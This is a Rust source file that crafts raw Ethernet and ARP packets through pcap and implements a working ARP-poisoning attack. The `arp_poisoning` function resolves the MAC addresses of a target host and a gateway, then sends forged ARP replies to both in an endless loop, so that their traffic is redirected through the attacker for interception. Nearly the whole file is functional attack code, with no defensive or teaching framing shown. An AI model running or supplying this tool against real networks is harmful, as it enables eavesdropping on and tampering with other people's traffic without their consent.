use std::mem;
use std::time::Duration;
use std::sync::{Arc, Mutex};
use std::thread;
use std::net::Ipv4Addr;

use pcap;

#[derive(Debug, Clone)]
#[repr(C)]
pub struct Ethernet {
    pub dest_mac: [u8; 6],        /* Target hardware address */
    pub source_mac: [u8; 6],      /* Sender hardware address */
    pub ether_type: u16,          /* Ethernet type           */
}

impl Ethernet {
    pub fn new(dest_mac: [u8; 6], source_mac: [u8; 6]) -> Ethernet {
        Ethernet {
            dest_mac: dest_mac,
            source_mac: source_mac,
            ether_type: u16::to_be(0x0806)
        }
    }

    pub fn to_raw(&self) -> [u8; 14] {
        unsafe { mem::transmute_copy::<Ethernet, [u8; 14]>(&self) }
    }
}

pub enum ArpType {
    ArpRequest,
    ArpReply
}

/* ARP Header, (assuming Ethernet+IPv4)                      */
/* Values are stored as big endian                           */
#[derive(Debug, Clone)]
#[repr(C)]
pub struct ArpHeader {
    pub ethernet: Ethernet,       /* Ethernet frame          */
    pub hardware_type: u16,       /* Hardware Type           */
    pub protocol_type: u16,       /* Protocol Type           */
    pub hardware_size: u8,        /* Hardware Address Size   */
    pub protocol_size: u8,        /* Protocol Address Size   */
    pub op_code: u16,             /* Operation Code          */
    pub source_mac: [u8; 6],      /* Sender hardware address */
    pub source_ip: [u8; 4],       /* Sender IP address       */
    pub dest_mac: [u8; 6],        /* Target hardware address */
    pub dest_ip: [u8; 4],         /* Target IP address       */
}

impl ArpHeader {
    pub fn new(arp_type: ArpType,
               source_mac: [u8; 6],
               source_ip: Ipv4Addr,
               dest_mac: [u8; 6],
               dest_ip: Ipv4Addr) -> ArpHeader {

        let op_code: u16 = match arp_type {
            ArpType::ArpRequest  => 1,
            ArpType::ArpReply    => 2,
        };

        ArpHeader {
            ethernet: Ethernet::new(dest_mac, source_mac),
            hardware_type: u16::to_be(0x1),     // Ethernet
            protocol_type: u16::to_be(0x0800),  // IPv4
            hardware_size: u8::to_be(6),
            protocol_size: u8::to_be(4),
            op_code: u16::to_be(op_code),
            source_mac: source_mac,
            source_ip: source_ip.octets(),
            dest_mac: dest_mac,
            dest_ip: dest_ip.octets(),
        }
    }

    pub fn from_raw(arp_header: &[u8]) -> Option<ArpHeader> {
        if arp_header.len() < 42 { // ethernet (14) + arp (28)
            return None;
        }

        let mut array = [0u8; 42];
        for (&x, p) in arp_header.iter().zip(array.iter_mut()) {
            *p = x;
        }
        unsafe { Some(mem::transmute::<[u8; 42], ArpHeader>(array)) }
    }

    pub fn to_raw(&self) -> [u8; 42] {
        unsafe { mem::transmute_copy::<ArpHeader, [u8; 42]>(&self) }
    }
}

pub fn arp_poisoning(cap_ptr: Arc<Mutex<pcap::Capture<pcap::Active>>>,
                     own_mac_addr: [u8; 6], own_ip_addr: Ipv4Addr,
                     target_ip: Ipv4Addr, gateway_ip: Ipv4Addr) {

    let mac_a = resolve_mac_addr(cap_ptr.clone(), own_mac_addr, own_ip_addr, target_ip).unwrap();
    let mac_b = resolve_mac_addr(cap_ptr.clone(), own_mac_addr, own_ip_addr, gateway_ip).unwrap();

    let mut packets: Vec<ArpHeader> = Vec::new();
    packets.push(ArpHeader::new(ArpType::ArpReply, own_mac_addr, target_ip, mac_b, gateway_ip));
    packets.push(ArpHeader::new(ArpType::ArpReply, own_mac_addr, gateway_ip, mac_a, target_ip));

    println!("[+] Poisoning traffic between {} <==> {}", target_ip, gateway_ip);
    loop {
        {
            let mut cap = cap_ptr.lock().unwrap();
            for p in &packets {
                match cap.sendpacket(&p.to_raw()) {
                    Ok(_) => (),
                    Err(e) => println!("Unable to send packet: {}" , e),
                }
            }
        }
        thread::sleep(Duration::from_millis(1500));
    }
}

/// This function sends an ArpRequest to resolve the mac address for the given ip
pub fn resolve_mac_addr(cap_ptr: Arc<Mutex<pcap::Capture<pcap::Active>>>, own_mac_addr: [u8; 6], own_ip_addr: Ipv4Addr, ip_addr: Ipv4Addr) ->Option<[u8; 6]> {

    let scoped_cap_ptr = cap_ptr.clone();
    // Spawn new thread to capture ArpReply
    let join_handle = thread::spawn(move || {

        let max_fails = 4;
        let mut fail_counter = 0;

        loop {
            if fail_counter >= max_fails {
                println!("{} seems to be offline", ip_addr);
                return None;
            }
            let mut cap = scoped_cap_ptr.lock().unwrap();
            match cap.next() {
                Ok(packet) => {
                    let arp_header = ArpHeader::from_raw(packet.data).unwrap();
                    if arp_header.op_code == u16::to_be(0x2) {
                        if ip_addr == Ipv4Addr::new(arp_header.source_ip[0],
                                                    arp_header.source_ip[1],
                                                    arp_header.source_ip[2],
                                                    arp_header.source_ip[3]) {
                            println!("Found {} at {}", mac_to_string(&arp_header.source_mac), ip_addr);
                            return Some(arp_header.source_mac);
                        }
                    }
                },
                Err(_) => fail_counter += 1,
            }
        }
    });

    let crafted = ArpHeader::new(ArpType::ArpRequest,
                                 own_mac_addr, own_ip_addr,
                                 [0xff, 0xff, 0xff, 0xff, 0xff, 0xff],
                                 ip_addr);

    // Send some ArpRequests
    for _ in 0..10 {
        let mut cap = cap_ptr.lock().unwrap();
        match cap.sendpacket(&crafted.to_raw()) {
            Ok(_)   => (),
            Err(e)  => panic!("[!] Unable to send packet: {}", e),
        }
        thread::sleep(Duration::from_millis(25));
    }
    join_handle.join().unwrap()
}

pub fn mac_to_string(mac_addr: &[u8; 6]) -> String {
    let hx: Vec<String> = mac_addr.iter().map(|b| format!("{:02X}", b)).collect();
    hx.join(":")
}

pub fn string_to_mac(string: String) -> [u8; 6] {
    let hx: Vec<u8> = string.split(":").map(|b| u8::from_str_radix(b, 16).unwrap()).collect();
    if hx.len() != 6 {
        panic!("string_to_mac: mac address octet length is invalid: {}", string);
    }

    let mut mac_addr = [0u8; 6];
    for (&x, p) in hx.iter().zip(mac_addr.iter_mut()) {
        *p = x;
    }
    mac_addr
}
